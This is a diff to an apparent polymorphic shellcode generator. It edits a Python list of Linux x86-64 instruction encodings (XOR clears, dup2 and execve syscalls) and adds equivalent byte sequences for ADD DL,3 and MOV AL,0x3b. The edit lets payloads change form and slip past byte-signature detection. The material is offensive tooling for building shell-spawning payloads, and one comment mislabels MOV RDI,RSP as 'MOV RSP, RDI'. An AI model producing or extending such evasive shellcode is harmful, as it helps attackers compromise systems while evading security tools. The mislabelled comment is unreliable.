@@ -28,8 +28,7 @@ linux_x64 = [
     [r"\x0f\x05"],     # SYSCALL
     [r"\x48\x31\xf6", r"\x48\x29\xf6"], # XOR RSI
     [r"\x31\xd2", r"\x29\xd2"],     # XOR EDX, EDX
-    [r"\x80\xc2\x03", r"\xb2\x03"], # ADD DL, 0x3
-    [""],
+    [r"\x80\xc2\x03", r"\xb2\x03", r"\x80\xEA\xFD"], # ADD DL, 0x3             
     [r"\x48\x31\xc0", r"\x48\x29\xc0"], # XOR RAX
     [r"\x04\x21", r"\xb0\x21", r"\x2C\xDF"],     # ADD AL, 0x21           
     [r"\x0f\x05"],     # SYSCALL
@@ -46,7 +45,7 @@ linux_x64 = [
     [r"\x52"],         # PUSH RDX
     [r"\x48\x31\xd2", r"\x48\x29\xd2"], # XOR RDX, RDX
     [r"\x48\x89\xe7"], # MOV RSP, RDI
-    [r"\xb0\x3b"],     # MOV AL, 0x3b
+    [r"\xb0\x3b", r"\x48\x31\xC0\x04\x3B"],     # MOV AL, 0x3b            
     [r"\x0f\x05"],     # SYSCALL
 ]
 
